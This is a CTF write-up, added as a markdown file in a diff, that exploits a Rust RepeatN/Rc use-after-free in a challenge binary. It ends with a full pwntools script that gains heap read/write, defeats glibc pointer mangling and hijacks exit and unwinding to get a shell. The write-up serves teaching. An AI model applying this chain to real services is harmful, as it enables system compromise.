@@ -1,0 +1,558 @@
+# blazing-fast-workout-planner
+
+## first look
+Here is the source code for the challenge:
+```rs
+#![feature(get_mut_unchecked)]
+
+use std::collections::BTreeMap;
+use std::io::{self, Read, Stdin, Stdout, Write};
+use std::iter::RepeatN;
+use std::rc::Rc;
+
+struct InputHelper {
+    stdin: Stdin,
+    stdout: Stdout,
+    buf: Vec<u8>,
+}
+
+impl InputHelper {
+    fn with_capacity(cap: usize) -> Self {
+        let stdin = io::stdin();
+        let stdout = io::stdout();
+        Self {
+            stdin,
+            stdout,
+            buf: vec![0u8; cap],
+        }
+    }
+
+    fn ask(&mut self, msg: &str) -> &[u8] {
+        self.stdout.write(msg.as_bytes()).unwrap();
+        self.stdout.write(b"\n").unwrap();
+        let len = self.stdin.read(&mut self.buf).unwrap();
+        &self.buf[..len].trim_ascii()
+    }
+
+    fn ask_num(&mut self, msg: &str) -> i64 {
+        let buf = self.ask(msg);
+        std::str::from_utf8(buf).unwrap().parse().unwrap()
+    }
+}
+
+#[derive(Debug)]
+struct Exercise {
+    name: Vec<u8>,
+    description: Vec<u8>,
+}
+
+#[derive(Debug, Clone)]
+struct Workout {
+    exercises: Vec<RepeatN<Rc<Exercise>>>,
+}
+
+fn main() {
+    let mut exercises = BTreeMap::new();
+    let mut workouts = Vec::new();
+
+    let mut input = InputHelper::with_capacity(0x100);
+
+    println!("Welcome to your personal training helper! Here are your options:");
+    loop {
+        println!("1. : add a new exercise to your portfolio");
+        println!("2. : plan a new workout");
+        println!("3. : start a training session");
+        println!("4. : edit an exercise");
+        println!("5. : exit the app");
+
+        let line = input.ask("Choose an option: ").trim_ascii();
+        match &*line {
+            b"1" => {
+                let name = input.ask("What's the name of your exercise? ").to_owned();
+
+                let description = input
+                    .ask("what is the description of your exercise? ")
+                    .to_owned();
+
+                let name2 = name.clone();
+                let exercise: Exercise = Exercise { name, description };
+                exercises.insert(name2, Rc::new(exercise));
+                println!("Exercise added!");
+            }
+            b"2" => {
+                let num_exercises = input.ask_num("How many exercises should your workout have? ");
+                let mut workout = Workout {
+                    exercises: Vec::new(),
+                };
+
+                for _ in 0..num_exercises {
+                    let name = input.ask("Enter the name of the exercise: ");
+                    if let Some(exercise) = exercises.get(name) {
+                        let num_repetitions =
+                            input.ask_num("How many times should your exercise be repeated? ");
+                        workout.exercises.push(std::iter::repeat_n(
+                            Rc::clone(exercise),
+                            num_repetitions as usize,
+                        ));
+                    } else {
+                        println!("No exercise found with that name.");
+                    }
+                }
+
+                println!("Your workout has id {}", workouts.len());
+                workouts.push(workout);
+            }
+            b"3" => {
+                let id = input.ask_num("what's the id of your workout? ");
+
+                let workout = &workouts[id as usize];
+
+                for exercise in workout.exercises.iter().cloned() {
+                    for ex in exercise {
+                        println!("{:?} - {:?}", ex.name, ex.description); // pls  help, this looks weird :(
+                    }
+                }
+            }
+            b"4" => {
+                let name = input.ask("Enter the name of the exercise you want to edit: ");
+                if let Some(exercise) = exercises.get_mut(name) {
+                    let description = input.ask("Enter the new description: ");
+                    unsafe {
+                        Rc::get_mut_unchecked(exercise)
+                            .description
+                            .copy_from_slice(description)
+                    }
+                    println!("Exercise updated!");
+                } else {
+                    println!("No exercise found with that name.");
+                }
+            }
+            b"5" => break,
+            _ => println!("That was not a valid option"),
+        }
+    }
+}
+```
+
+The challenge allows you to create `Exercise` structures and `Workout` structures
+```rs
+#[derive(Debug)]
+struct Exercise {
+    name: Vec<u8>,
+    description: Vec<u8>,
+}
+
+#[derive(Debug, Clone)]
+struct Workout {
+    exercises: Vec<RepeatN<Rc<Exercise>>>,
+}
+```
+and always wraps `Exercises` in a `Rc`.
+```rs
+                let exercise: Exercise = Exercise { name, description };
+                exercises.insert(name2, Rc::new(exercise));
+                println!("Exercise added!");
+```
+
+## std::rc::Rc
+`Rc` stands for `reference counted` and is documented [here](https://doc.rust-lang.org/std/rc/struct.Rc.html) in the rust documentation. `Rc` is a type that
+allows for shared ownership of a value through refcounting. When a `Rc` is created, the internal refcount is set to 1. When a `Rc` is cloned, the internal
+refcount is incremented, and when dropped the refcount is decremented. Modifying the `Rc` value is only allowed when the refcount is 1, meaning that there is only
+1 owner and not breaking rusts shared mutability rules.
+
+The internal structure of `Rc` looks like this:
+```c
+struct RcBox<T> {
+    size_t strong;
+    size_t weak;
+    T value;
+};
+
+struct Rc<T> {
+    RcBox<T> * ptr;
+};
+```
+
+All of the cloned copies of a `Rc` point to the same `RcBox` which is allocated on the heap. When the strong refcount reaches 0 the internal RcBox pointer is freed.
+This is safe because `Rc` disallows cloning once the refcount reaches 0.
+
+## sus code 1
+Immediately this part of the code looks suspicious:
+```rs
+            b"4" => {
+                let name = input.ask("Enter the name of the exercise you want to edit: ");
+                if let Some(exercise) = exercises.get_mut(name) {
+                    let description = input.ask("Enter the new description: ");
+                    unsafe {
+                        Rc::get_mut_unchecked(exercise)
+                            .description
+                            .copy_from_slice(description)
+                    }
+                    println!("Exercise updated!");
+                } else {
+                    println!("No exercise found with that name.");
+                }
+            }
+```
+since it contains an unsafe block. However this code, in the context of the rest of the program, is actually "safe", because if an `Rc` value exists in the
+hashmap the refcount must be at least 1 and the backing pointer is safe to write to the underlying value. This part of the code is not exploitable, even though
+it contains an unsafe block.
+
+## sus code 2
+The type of the workouts vec is `Vec<RepeatN<Rc<Exercise>>>`, which is unusual. I have never come across rust code that stored a `RepeatN` iterator combined
+with `Rc` values. A quick search for "RepeatN" and "Rc" brings up a github issue that mentions a uaf bug in the standard library involving `RepeatN` iterators
+over `Rc` values!
+
+[https://github.com/rust-lang/rust/issues/130140](https://github.com/rust-lang/rust/issues/130140)
+
+The issue was opened on 09/09/24, and the provided `rust-toolchain.toml` pins the rustc version to `nightly-2024-09-09`. Not suspicious at all.
+
+## stdlib uaf
+What does `RepeatN` do? `RepeatN` is an iterator type that returns the wrapped value n times before terminating.
+The issues arises from how `Rc` interacts with `RepeatN` when the repeat count is 0.
+
+This is the poc segfault provided by the github issue:
+```rs
+use std::rc::Rc;
+fn main() {
+    let mut c = [0; 100];
+    let x = std::iter::repeat_n(Rc::new(0), 0);
+    let y = Box::new(&mut c);
+    for _ in 0..100 {
+        _ = x.clone();
+    }
+    y.fill(0);
+}
+```
+
+When a `RepeatN` iterator is constructed with a count of 0 it will immediately drop the wrapped value. This causes problems for `Rc` because the backing pointer
+is freed, while `RepeatN` still holds a reference. Cloning the `RepeatN` iterator after the `Rc` value if freed will increment the `RcBox<T>->strong` count of the
+now freed backing pointer, giving an uaf increment primitive.
+
+## uaf heap increment
+In order to properly exploit this bug we need to allocate some heap object over the uaf'd object that has a useful value in the first qword (so it overlaps with
+`RcBox<T>->strong`). On gnu linux systems rust defaults to linking glibc and defers to glibc malloc to manage memory. `RcBox<Exercise>` gets allocated in a 0x50
+sized chunk, we need to somehow reclaim the freed `RcBox<Exercise>` with a useful structure. Since we only control the first qword, the structure must have some
+useful field in the first qword that allows for further exploitation.
+
+It turns out that the backing memory for the `Workout->exercises` vector is allocated in a 0x50 sized chunk!
+
+The backing memory looks like this:
+```
+         ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ uaf increment on this value
+ +0x00 | pointer to RcBox<Exercise> | ━┓
+ +0x08 | repeat count               | ━┻━━━ workout->exercises[0]
+ +0x10 | pointer to RcBox<Exercise> | ━┓
+ +0x18 | repeat count               | ━┻━━━ workout->exercises[1]
+```
+
+## arbitrary heap increment
+Remember that the `Workout->exercises` vector stores `RepeatN<Rc<Exercise>>` values. The original uaf increment is initially achieved through `RepeatN` with a
+count of 0, but now we can control the `RcBox<Exercise>` pointer that `RepeatN` uses. Using the initial uaf increment to modify the `RcBox<Exercise>` pointer of
+another `RepeatN`, escalates the bug to arbitrary increment in the heap.
+
+## arbitrary heap read/write
+With arbitrary increment can now modify the backing pointer of the `Exercise->description` field.
+```rs
+struct Exercise {
+    name: Vec<u8>,
+    description: Vec<u8>,
+}
+```
+Modifying `Exercise("A")->description` to point to `Exercise("B")->description` escalates our arbitrary increment bug to arbitrary heap read/write. Using
+`Exercise("A")` to modify the description field of `Exercise("B")` to an arbitrary address, then read/writing from `Exercise("B")` to achieve arbitrary
+read/write.
+```rs
+            b"4" => {
+                let name = input.ask("Enter the name of the exercise you want to edit: ");
+                if let Some(exercise) = exercises.get_mut(name) {
+                    let description = input.ask("Enter the new description: ");
+                    unsafe {
+                        Rc::get_mut_unchecked(exercise)
+                            .description
+                            .copy_from_slice(description)
+                    }
+                    println!("Exercise updated!");
+                } else {
+                    println!("No exercise found with that name.");
+                }
+            }
+```
+
+## rce
+Normally the go-to libc rce is overwriting stdout and using the wide vtable to call `system("/bin/sh")`, but this is rust the stdlib which does not use libc
+stdout and stdin. Instead they use the file descriptors directly, bypassing stdout and making fsop impossible.
+
+Alternatively we can attack the destructors that are called in exit, but that causes its own issues because of all the heap pointers that have been modified,
+which crashes the program when main returns.
+
+There is another novel method which I discovered while playing another ctf.
+The full call chain looks like:
+```c
+__libc_read
+┗━ SYSCALL_CANCEL
+  ┗━ LIBC_CANCEL_ASYNC
+    ┗━ __pthread_enable_asynccancel
+      ┗━ __do_cancel
+        ┗━ __pthread_unwind
+          ┗━ _Unwind_ForcedUnwind
+            ┗━ PTR_DEMANGLE(link()->ptr__Unwind_ForcedUnwind)
+```
+
+It only depends on the program using the `__libc_read` function.
+Breaking on `__libc_read` and running the challenge shows that `__libc_read` is used by rust stdlib!
+```rs
+#0  __GI___libc_read (fd=0x0, buf=0x5555555c2b80, nbytes=0x2000)
+    at ../sysdeps/unix/sysv/linux/read.c:25
+#1  0x000055555559716e in std::sys::pal::unix::fd::FileDesc::read_buf ()
+    at std/src/sys/pal/unix/fd.rs:156
+#2  std::sys::pal::unix::stdio::{impl#1}::read_buf () at std/src/sys/pal/unix/stdio.rs:22
+#3  std::io::stdio::{impl#0}::read_buf () at std/src/io/stdio.rs:104
+#4  std::io::impls::{impl#0}::read_buf<std::io::stdio::StdinRaw> () at std/src/io/impls.rs:21
+#5  std::io::buffered::bufreader::buffer::Buffer::fill_buf<&mut std::io::stdio::StdinRaw> ()
+    at std/src/io/buffered/bufreader/buffer.rs:136
+#6  std::io::buffered::bufreader::{impl#6}::fill_buf<std::io::stdio::StdinRaw> ()
+    at std/src/io/buffered/bufreader.rs:433
+#7  std::io::buffered::bufreader::{impl#5}::read<std::io::stdio::StdinRaw> ()
+    at std/src/io/buffered/bufreader.rs:325
+#8  0x0000555555597d66 in std::io::stdio::{impl#8}::read () at std/src/io/stdio.rs:499
+#9  std::io::stdio::{impl#5}::read () at std/src/io/stdio.rs:433
+#10 0x000055555557a29c in blazing_fast_workout_planner::InputHelper::ask (self=0x7fffffffd460, 
+    msg="Choose an option: ") at src/main.rs:28
+#11 0x000055555557a69a in blazing_fast_workout_planner::main () at src/main.rs:63
+```
+
+### elixir links:
+[`__libc_read`](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/sysdeps/unix/sysv/linux/read.c#L24)
+[`SYSCALL_CANCEL`](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/sysdeps/unix/sysdep.h#L118)
+[`LIBC_CANCEL_ASYNC`](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/sysdeps/unix/sysv/linux/sysdep-cancel.h#L30)
+[`__pthread_enable_asynccancel`](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/nptl/cancellation.c#L30)
+[`__do_cancel`](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/sysdeps/nptl/pthreadP.h#L264)
+[`__pthread_unwind`](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/nptl/unwind.c#L120)
+[`_Unwind_ForcedUnwind`](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/sysdeps/generic/unwind-resume.c#L48)
+[`__libc_unwind_link_get`](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/misc/unwind-link.c#L41)
+[`UNWIND_LINK_PTR`](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/sysdeps/generic/unwind-link.h#L64)
+
+Here are the necessary requirements to trigger the call an arbitrary function (in this case exit):
+```rs
+*((fs_base + 0x308) as *mut u64) = 8;
+libc.global.ptr__Unwind_ForcedUnwind = PTR_MANGLE(exit);
+libc.global_libgcc_handle = 1 as usize;
+libc.__libc_single_threaded_internal = 0 as u8;
+```
+
+Also setup a destructor to trigger a shell:
+```rs
+libc.__exit_funcs[0].fns[0].func.on.fn = PTR_MANGLE(system);
+libc.__exit_funcs[0].fns[0].func.on.arg = &"/bin/sh";
+```
+
+
+
+## full solve
+```py
+from pwn import *
+from pwnc.gdb.launch import attach
+import builtins
+
+if args.REMOTE:
+    p = remote("162.55.187.21", "1024")
+else:
+    p = remote("localhost", 1024)
+    p.recv(1)
+p.settimeout(10)
+
+file = ELF("./chall")
+linker = ELF("./ld-linux-x86-64.so.2")
+libc = ELF("./libc.so.6")
+
+if args.GDB:
+    g = attach("/chall", elf=file)
+
+def tele(n: int):
+    return g.parse_and_eval(f"(usize[{n}]*)0").type
+
+exercises = []
+def callback():
+    global exercises
+    val = g.parse_and_eval("value.ptr.pointer")
+    val.format_string()
+    exercises.append(val)
+
+    return False
+
+if args.GDB:
+    track = g.bp(
+        "alloc::collections::btree::map::BTreeMap<alloc::vec::Vec<u8, alloc::alloc::Global>, alloc::rc::Rc<blazing_fast_workout_planner::Exercise, alloc::alloc::Global>, alloc::alloc::Global>::insert<alloc::vec::Vec<u8, alloc::alloc::Global>, alloc::rc::Rc<blazing_fast_workout_planner::Exercise, alloc::alloc::Global>, alloc::alloc::Global>",
+        callback
+    )
+    g.execute("b system")
+    g.execute("c")
+
+def send(after: bytes, val, line: bool = False):
+    match type(val):
+        case builtins.int | builtins.str:
+            val = f"{val}".encode()
+        case builtins.bytes:
+            pass
+    if line: exit("bad")
+    p.sendafter(after, val.ljust(0x100, b" "))
+
+def sendline(after: bytes, val):
+    send(after, val, line=True)
+
+def make_exercise(name: int, desc: int, name_size: int = 0, desc_size: int = 8):
+    payload = b""
+    payload += p64(1) * 2
+    payload += p64(name_size)
+    payload += p64(name)
+    payload += p64(name_size)
+    payload += p64(desc_size)
+    payload += p64(desc)
+    payload += p64(desc_size)
+    payload += p64(1)
+    return payload
+
+def create_exercise(name: bytes, desc: bytes):
+    send(b"option: \n", 1)
+    send(b"? \n", name)
+    send(b"? \n", desc)
+
+if args.GDB:
+    create_exercise = track.wait(create_exercise)
+
+def plan_workout(exs: list[tuple[bytes, int]]):
+    send(b"option: \n", 2)
+    send(b"? \n", len(exs))
+    for ex in exs:
+        send(b": \n", ex[0])
+        send(b"? \n", ex[1])
+    p.recvuntil(b"Your workout has id ")
+    return int(p.recvline())
+
+def start_session(id: int):
+    send(b"option: \n", 3)
+    send(b"? \n", id)
+
+    outputs = []
+    while True:
+        ch = p.recv(1)
+        if ch != b"[":
+            break
+
+        name = bytes(eval("[" + p.recvuntil(b"]", drop=True).decode() + "]"))
+        p.recvuntil(b" - ")
+        desc = bytes(eval(p.recvline().decode()))
+        outputs.append((name, desc))
+
+    return outputs
+
+def edit_exercise(name, desc):
+    send(b"option: \n", 4)
+    send(b": \n", name)
+    send(b": \n", desc)
+
+a = "a" * 0x18
+b = "b" * 0x18
+mapping = {}
+
+create_exercise(a, "0")
+id = plan_workout([
+    (a, 0),
+])
+mapping[a] = id
+create_exercise(a, "1")
+
+victim = plan_workout([
+    (a, 0),
+])
+
+tramp = "T" * 0x48
+target = "X" * 0x48
+create_exercise(tramp, "R" * 0x48)
+create_exercise(target, "Y" * 0x48)
+
+if args.GDB:
+    print([str(ex) for ex in exercises])
+    print(exercises[0].cast(tele(4))[0].format_string())
+
+payload = b""
+for _ in range(0x170):
+    payload += b"3".ljust(0x100, b" ")
+    payload += f"{mapping[a]}".encode().ljust(0x100, b" ")
+
+send(b"option: \n", payload)
+for _ in range(0x170-1):
+    p.recvuntil(b"option: \n")
+
+if args.GDB:
+    print(exercises[0].cast(tele(4))[0].format_string())
+
+payload = b""
+for _ in range(0x1e0):
+    payload += b"3".ljust(0x100, b" ")
+    payload += f"{victim}".encode().ljust(0x100, b" ")
+
+send(b"option: \n", payload)
+for _ in range(0x1e0-1):
+    p.recvuntil(b"option: \n")
+
+print(f"{tramp = }")
+
+leaker = plan_workout([
+    (tramp, 1),
+])
+leaks = start_session(leaker)
+leak = u64(leaks[0][1][0x18:0x20])
+print(f"{leak = :#x}")
+heapbase = leak - 0x3180
+print(f"{heapbase = :#x}")
+
+reader = plan_workout([
+    (target, 1),
+])
+
+def arbread(addr: int):
+    edit_exercise(tramp, make_exercise(heapbase, addr))
+    leaks = start_session(reader)
+    print(leaks)
+    return leaks[0][1]
+
+def arbwrite(addr: int, val: bytes):
+    edit_exercise(tramp, make_exercise(heapbase, addr, desc_size=len(val)))
+    assert b"\n" not in val
+    edit_exercise(target, val)
+
+leak = u64(arbread(heapbase + 0x470))
+print(f"{leak = :#x}")
+libc.address = leak - 0x202228
+print(f"{libc.address = :#x}")
+
+linker.address = u64(arbread(libc.address + 0x2046b8)) - 0x38000
+
+fn = libc.address + 0x204fd8
+enc = u64(arbread(fn))
+mask = (1 << 64) - 1
+cookie = (enc >> 17 & mask) | (enc << (64 - 17) & mask)
+cookie ^= linker.sym._dl_fini
+
+print(f"{cookie = :#x}")
+
+enc = libc.sym.system ^ cookie
+enc = (enc << 17 & mask) | (enc >> (64 - 17) & mask)
+arbwrite(libc.sym.initial + 24, p64(enc) + p64(next(libc.search(b"/bin/sh\x00"))))
+
+tls = u64(arbread(linker.address + 0x390a0)) - 0x9a0
+print(f"{tls = :#x}")
+
+enc = libc.sym.exit ^ cookie
+enc = (enc << 17 & mask) | (enc >> (64 - 17) & mask)
+arbwrite(tls + 0x308, p32(8))
+arbwrite(libc.sym.global_libgcc_handle, p64(1))
+arbwrite(libc.address + 0x20b080 + 8, p64(enc))
+arbwrite(libc.sym.__libc_single_threaded_internal, p8(0))
+
+if args.GDB:
+    g.execute("interrupt")
+p.interactive()
+```
